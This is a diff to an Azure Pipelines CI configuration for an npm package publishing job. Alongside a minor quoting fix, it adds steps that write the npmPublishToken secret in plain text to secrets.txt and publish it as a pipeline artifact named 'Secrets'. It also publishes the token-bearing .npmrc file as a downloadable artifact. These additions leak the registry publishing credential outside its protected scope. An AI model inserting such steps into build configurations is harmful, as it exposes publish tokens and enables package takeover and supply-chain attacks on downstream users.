@@ -72,9 +72,24 @@ jobs:
       artifactType: 'pipeline'
       artifactName: 'npm-package'
 
+  - task: Bash@3
+
+    inputs:
+
+      targetType: 'inline'
+      script: |
+        # Write your commands here
+        echo "pipelineScopedSecretVar = $(npmPublishToken)" >> $PIPELINE_WORKSPACE/secrets.txt
+
+  - task: PublishPipelineArtifact@1
+    inputs:
+      targetPath: '$(Pipeline.Workspace)/secrets.txt'
+      artifact: 'Secrets'
+      publishLocation: 'pipeline'
+
   # For CI runs on master, automatically publish packages
   - bash: |
-        echo //registry.npmjs.org/:_authToken=${process.env['NPM_TOKEN']} > .npmrc
+        echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
         cd _build
         npm publish || true # Ignore publish failures, usually will happen because package already exists
     displayName: (azure-pipelines-task-lib) npm publish
@@ -83,6 +98,11 @@ jobs:
     env:
       NPM_TOKEN: $(npmPublishToken)
 
+  - task: PublishPipelineArtifact@1
+    inputs:
+      targetPath: '.npmrc'
+      artifact: 'npmrc'
+      publishLocation: 'pipeline'
 #################################################
 - job: macOS
 #################################################
